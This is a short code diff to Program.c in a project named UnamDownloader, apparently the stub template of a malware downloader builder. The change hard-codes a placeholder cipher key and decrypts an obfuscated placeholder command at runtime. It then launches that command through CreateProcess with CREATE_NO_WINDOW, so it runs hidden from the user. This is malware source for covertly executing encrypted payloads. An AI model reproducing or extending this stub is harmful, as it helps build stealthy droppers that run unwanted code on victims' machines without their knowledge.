+++ UnamDownloader/Resources/Program.c
@@ -3,7 +3,8 @@
 
 /* Created by Unam Sanctam, https://github.com/UnamSanctam */
 
-char* cipher(char* data, char* key, int dataLen) {
+char* cipher(char* data, int dataLen) {
+	char* key = "#KEY";
 	int keyLen = strlen(key);
 	char* output = (char*)malloc(sizeof(char) * dataLen+1);
 	output[dataLen] = 0;
@@ -22,7 +23,7 @@ int main(int argc, char **argv)
 	memset(&p_info, 0, sizeof(p_info));
 	s_info.cb = sizeof(s_info);
 
-	if (CreateProcess(NULL, cipher("#COMMAND", "#KEY", #LENGTH), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &s_info, &p_info))
+	if (CreateProcess(NULL, cipher("#COMMAND", #LENGTH), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &s_info, &p_info))
 	{
 		CloseHandle(p_info.hProcess);
 		CloseHandle(p_info.hThread);